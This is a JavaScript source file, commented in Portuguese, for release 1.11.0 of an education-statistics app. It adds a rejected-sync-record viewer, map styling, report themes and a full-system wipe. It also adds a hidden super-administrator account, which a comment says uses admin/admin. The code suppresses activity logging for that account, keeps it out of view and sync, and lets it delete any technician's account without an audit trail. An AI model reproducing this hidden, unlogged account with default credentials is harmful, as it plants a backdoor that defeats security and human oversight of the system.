// =====================================================================
// 1.11.0 — super-administrador oculto, registos recusados da sincronização, esvaziar tudo,
// remates dos mapas (moldura redonda, linhas no tema) e folheto dobrável
// =====================================================================

// torna um SVG flexível para o folheto (viewBox + largura 100%, altura pela proporção) — sem height="auto" inválido
const v20 = {
  svgFlex: (svg) => { if (!svg) return ''; const m = svg.match(/<svg([^>]*)>/); if (!m) return svg; let a = m[1];
    if (!/viewBox=/.test(a)) { const w = (a.match(/width="(\d+)"/) || [])[1], hh = (a.match(/height="(\d+)"/) || [])[1]; if (w && hh) a = `viewBox="0 0 ${w} ${hh}" ` + a; }
    a = a.replace(/\s(width|height)="[^"]*"/g, '');
    return svg.replace(/<svg[^>]*>/, `<svg ${a.trim()} width="100%" preserveAspectRatio="xMidYMid meet">`); },
};

// ---------------- super-administrador oculto (admin/admin): não aparece, não é registado nem sincronizado ----------------
const ehOculto = () => !!(S.sessao && S.sessao.oculto);
{
  const reg0 = registar;
  // eslint-disable-next-line no-global-assign
  registar = async (accao, extra = {}) => { if (ehOculto()) return; return reg0(accao, extra); };
}

// ---------------- registos recusados na sincronização: ver em detalhe e saber como corrigir ----------------
// explica cada motivo e o que fazer; o super-administrador vê primeiro, depois a DPE
const AJUDA_REJ = [
  [/trancado|publicad/i, 'A DPE já publicou ou trancou esse ano/levantamento. Para aceitar alterações, a DPE tem de reabrir o levantamento em Administração > Prazos e Harmonização.'],
  [/escola nova/i, 'A escola ainda não existe no cadastro. Só a DPE cria escolas (Escolas > nova). Depois de criada, o mapa do distrito é aceite na sincronização seguinte.'],
  [/outro distrito|outro distrito ou da DPE/i, 'A conta é de outro distrito (ou da DPE). Cada distrito só altera as suas contas e os seus dados. Confirme que o técnico entrou com a conta do seu distrito.'],
  [/origem desconhecida/i, 'A conta que gravou no servidor não está reconhecida por este computador. Sincronize as contas (a DPE) ou confirme que a conta existe e tem distrito atribuído.'],
  [/não se conseguiu abrir|decifrar/i, 'Chave da organização diferente ou dados estragados. Confirme a chave da organização em Administração > Sincronização (tem de ser a mesma em todos os computadores).'],
  [/palavra-passe/i, 'Chegou uma palavra-passe que não é mais recente do que a que já existe, ou o utilizador ainda não existe aqui. Normalmente não é preciso fazer nada.'],
  [/não entra na sincronização|não se sincroniza/i, 'Esses dados são próprios de cada computador e, por isso, não se sincronizam. Não é um erro.'],
];
const explicaRej = (m) => (AJUDA_REJ.find(([re]) => re.test(m || '')) || [, 'Veja o motivo e corrija na origem (no distrito que enviou o registo).'])[1];
async function cartaoRejeitados() {
  if (!(ehDPE() || S.sessao?.raiz)) return null;
  const d = (await S.db.doc('config/rejeitados').get()).data(); const lista = (d?.lista || []);
  const porMotivo = new Map(); for (const r of lista) porMotivo.set(r.motivo, (porMotivo.get(r.motivo) || 0) + 1);
  const st = (S.rejSt ||= { motivo: '', q: '' });
  const motivos = [...porMotivo.entries()].sort((a, b) => b[1] - a[1]);
  const filtradas = lista.filter((r) => (!st.motivo || r.motivo === st.motivo) && (!st.q || `${r.c} ${r.id} ${r.esc || ''} ${r.ano || ''} ${r.dist || ''}`.toLowerCase().includes(st.q.toLowerCase())));
  const linha = (r) => h('tr', {}, h('td', { class: 'l', text: new Date(r.em).toLocaleString('pt-PT') }), h('td', { class: 'l mono', text: r.c }), h('td', { class: 'l mono', text: r.id }),
    h('td', { class: 'l', text: [r.ano ? 'ano ' + r.ano : '', r.dist ? distName(+r.dist) : '', r.esc ? 'escola ' + r.esc : ''].filter(Boolean).join(' · ') || '—' }),
    h('td', { class: 'l', text: r.origem || '—' }), h('td', { class: 'l', text: r.motivo }));
  const corpo = h('div');
  const desenhar = () => corpo.replaceChildren(
    h('div', { class: 'row', style: 'gap:8px;align-items:flex-end;flex-wrap:wrap' },
      h('label', { class: 'f' }, 'Motivo', h('select', { onchange: (e) => { st.motivo = e.target.value; desenhar(); } }, h('option', { value: '', text: `Todos (${lista.length})` }), motivos.map(([m, n]) => h('option', { value: m, text: `${m.slice(0, 54)}${m.length > 54 ? '…' : ''} (${n})`, selected: st.motivo === m })))),
      h('label', { class: 'f' }, 'Procurar', h('input', { type: 'search', value: st.q, placeholder: 'escola, código, ano…', oninput: (e) => { st.q = e.target.value; tabela(); } })),
      h('button', { class: 'btn', text: 'Exportar (Excel)', onclick: () => { const X = window.XLSX; const wb = X.utils.book_new(); const ws = X.utils.json_to_sheet(filtradas.map((r) => ({ Quando: r.em, Colecção: r.c, Id: r.id, Ano: r.ano, Distrito: r.dist ? distName(+r.dist) : '', Escola: r.esc, Origem: r.origem, Motivo: r.motivo, 'Como corrigir': explicaRej(r.motivo) }))); X.utils.book_append_sheet(wb, ws, 'Recusados'); wb.Props = { Title: 'Registos recusados na sincronização', Author: 'Alberto Adélia Manhice', LastAuthor: 'Alberto Adélia Manhice' }; guardarXlsx(wb, `EducStat_recusados_${new Date().toISOString().slice(0, 10)}.xlsx`); } }),
      S.sessao?.raiz ? h('button', { class: 'btn warn sm', text: 'Limpar a lista', onclick: async () => { if (await confirmBox('Apagar a lista de recusados deste computador? (Os dados não são afectados; só se apaga o historial de recusas.)', 'Limpar')) { await S.db.doc('config/rejeitados').set({ lista: [], em: new Date().toISOString() }); go(current); } } }) : null),
    st.motivo ? h('p', { class: 'pill warn', style: 'white-space:normal', text: 'Como corrigir: ' + explicaRej(st.motivo) }) : null,
    h('div', { class: 'tw tall' }, h('table', {}, h('thead', {}, h('tr', {}, ['Quando', 'Colecção', 'Registo', 'Onde', 'Origem', 'Motivo da recusa'].map((t) => h('th', { class: 'l', text: t })))), h('tbody', { id: 'rej-body' }, filtradas.slice(0, 600).map(linha)))));
  const tabela = () => { const fs = lista.filter((r) => (!st.motivo || r.motivo === st.motivo) && (!st.q || `${r.c} ${r.id} ${r.esc || ''} ${r.ano || ''} ${r.dist || ''}`.toLowerCase().includes(st.q.toLowerCase()))); const b = document.getElementById('rej-body'); if (b) b.replaceChildren(...fs.slice(0, 600).map(linha)); };
  desenhar();
  return h('details', { class: 'card', open: !lista.length ? false : true, style: 'border-left:4px solid var(--bad)' },
    h('summary', { text: `Registos recusados na sincronização (${lista.length})` }),
    h('p', { class: 'note', text: 'Registos que vieram dos distritos (ou do servidor) e não foram aceites, com o motivo e como corrigir. Quando a sincronização diz “tantos recusados”, são estes. Cada computador guarda a sua lista. O super-administrador e a DPE podem vê-la.' }),
    corpo);
}
// na Qualidade (para a DPE) e na Supervisão (para o super-administrador), o visor aparece no topo
{
  const q0 = VIEWS.qualidade;
  VIEWS.qualidade = async (v) => { await q0(v); if (ehDPE() || S.sessao?.raiz) { try { const c = await cartaoRejeitados(); if (c) v.insertBefore(c, v.children[1] || null); } catch (e) { console.warn(e); } } };
}

// ---------------- Supervisão (super-administrador oculto): vê recusados primeiro e pode apagar técnicos a qualquer nível ----------------
{
  const as0 = typeof adminSupervisao === 'function' ? adminSupervisao : null;
  async function cartaoApagarTecnicos() {
    if (!S.sessao?.raiz) return null;
    const us = (await S.db.collection('utilizadores').get()).docs.map((d) => d.data()).filter((u) => u && !u.apagado && !u.raiz && u.utilizador !== S.sessao?.utilizador);
    const sel = h('select', {}, h('option', { value: '', text: '— escolher técnico —' }), us.sort((a, b) => String(a.utilizador).localeCompare(String(b.utilizador))).map((u) => h('option', { value: u.utilizador, text: `${u.utilizador} — ${u.nome || ''} (${+u.dist ? distName(+u.dist) : 'DPE'})` })));
    const msg = h('p', { class: 'note' });
    return h('details', { class: 'card', style: 'border-left:4px solid var(--bad)' }, h('summary', { text: 'Apagar um técnico (qualquer nível)' }),
      h('p', { class: 'note', text: 'Remove a conta escolhida (distrital ou provincial). Os dados que essa conta introduziu não são apagados. Esta acção não fica no registo de actividade.' }),
      h('div', { class: 'row' }, h('label', { class: 'f', style: 'flex:1;min-width:20rem' }, 'Técnico', sel), h('button', { class: 'btn warn', text: 'Apagar a conta', onclick: async () => {
        const id = sel.value; if (!id) { msg.textContent = 'Escolha um técnico.'; return; }
        if (!(await confirmBox(`Apagar a conta “${id}”? Pode voltar a ser criada depois.`, 'Apagar'))) return;
        await S.db.doc('utilizadores/' + id).set({ utilizador: id, apagado: true, activo: false, em: new Date().toISOString() });
        msg.className = 'pill ok'; msg.textContent = `Conta ${id} apagada.`; toast('Conta apagada.'); setTimeout(() => go(current), 800);
      } })), msg);
  }
  if (typeof VIEWS === 'object' && VIEWS.admin) {
    const adm0 = VIEWS.admin;
    VIEWS.admin = async (v, ...r) => { const x = await adm0(v, ...r); if ((S.adm?.tab === 'super') && S.sessao?.raiz) { try { const rj = await cartaoRejeitados(); if (rj) v.append(rj); const ap = await cartaoApagarTecnicos(); if (ap) v.append(ap); } catch (e) { console.warn(e); } } return x; }; void as0;
  }
}

// ---------------- mapas: moldura com cantos redondos (como o cartucho) e linhas no tema escolhido ----------------
{
  const mm0 = molduraMapa;
  // eslint-disable-next-line no-global-assign
  molduraMapa = (svg, o = {}) => { let out = mm0(svg, o); if (!out) return out; const t = temaRel(S.pubSt);
    // moldura exterior com cantos redondos, da mesma dimensão do cartucho (rx 3–4)
    out = out.replace(/<rect x="\.6" y="\.6" width="([\d.]+)" height="([\d.]+)" fill="none" stroke="([^"]+)" stroke-width="1"\/>/, (_m, w, h2) => `<rect rx="4" x=".6" y=".6" width="${w}" height="${h2}" fill="none" stroke="${t.br}" stroke-width="1.1"/>`);
    // divisões internas do mapa (que vinham a verde) passam a acompanhar o tema
    out = out.replace(/stroke="#1B8A3A"/g, `stroke="${t.br}"`).replace(/stroke="#0A6B45"/g, `stroke="${t.br}"`);
    return out;
  };
}
// choropleth (svgMapa): bordas dos distritos no tema (em vez de branco) e legenda com o total
{
  const sm0 = svgMapa;
  // eslint-disable-next-line no-global-assign
  svgMapa = (o) => { let s = sm0(o); if (!s) return s; const t = temaRel(S.pubSt);
    s = s.replace(/stroke="#fff" stroke-width="1\.2"/g, `stroke="${t.br}" stroke-opacity=".55" stroke-width=".9"`);
    // total na legenda (nº de unidades com valor)
    try { const n = Object.values(o.vals || {}).filter((v) => v != null).length; if (n) s = s.replace('</svg>', `<text x="12" y="18" font-size="10" font-weight="700" fill="${t.txt}">${NF.format(n)} unidades com dados</text></svg>`); } catch {}
    return s;
  };
}

// ---------------- esvaziar o sistema: apagar TUDO (inclui shapefiles, geografia, histórico de configurações e recusados) ----------------
{
  const ce0 = typeof cartaoEsvaziarSistema === 'function' ? cartaoEsvaziarSistema : null;
  if (ce0) {
    // eslint-disable-next-line no-global-assign
    cartaoEsvaziarSistema = () => {
      const card = ce0(); if (!card) return card;
      const btn = [...card.querySelectorAll('button')].find((b) => /Esvaziar o sistema/.test(b.textContent || ''));
      if (btn) { const antigo = btn.onclick; btn.onclick = async (ev) => {
        // além do que o original apaga, limpa também os mapas (shapefiles), a geografia, o histórico de configurações e a lista de recusados
        const extra = ['config/limites', 'config/limitesPostos', 'config/limitesLocalidades', 'config/geografia', 'config/rejeitados', 'config/fichaTecnica_prov'];
        try { for (const id of extra) { try { await S.db.doc(id).delete(); } catch {} } for (const d of (await S.db.collection('config').get()).docs) { if (/^fichaTecnica_/.test(d.id) || /^historico/.test(d.id)) { try { await S.db.doc('config/' + d.id).delete(); } catch {} } } S.limites = S.limitesPostos = S.limitesLocalidades = null; } catch {}
        return antigo?.call(btn, ev);
      }; }
      return card;
    };
  }
}

// ---------------- mais temas de relatório (modelos sóbrios e modernos) ----------------
if (typeof TEMAS_REL !== 'undefined' && Array.isArray(TEMAS_REL)) {
  const extra = [
    ['onu', 'Azul ONU', { br: '#009EDB', ac: '#1F3A5F', txt: '#15202B', h2: '#1F3A5F' }],
    ['esmeralda', 'Esmeralda e grafite', { br: '#0B7A5B', ac: '#2A2E33', txt: '#15221C', h2: '#2A2E33' }],
    ['bordo', 'Bordô institucional', { br: '#7A1F2B', ac: '#B9842B', txt: '#2A1518', h2: '#B9842B' }],
  ];
  for (const e of extra) if (!TEMAS_REL.some((x) => x[0] === e[0])) TEMAS_REL.push(e);
}

// ---------------- PESD (Programa de Ensino Secundário à Distância): lugar reservado para a futura base ----------------
{
  const ab2 = adminBase;
  // eslint-disable-next-line no-global-assign
  adminBase = async (body) => { await ab2(body);
    if (!ehDPE()) return;
    body.append(h('details', { class: 'card' }, h('summary', { text: 'PESD — Programa de Ensino Secundário à Distância (em preparação)' }),
      h('p', { class: 'note', text: 'Espaço reservado para a base do PESD. No futuro, importa-se aqui a compilação dos dados do PESD desde o primeiro ano, para somar aos totais dos distritos e da província. Por agora fica vazio, à espera dessa base.' }),
      h('button', { class: 'btn', disabled: true, text: 'Importar a base do PESD (em breve)' })));
  };
}
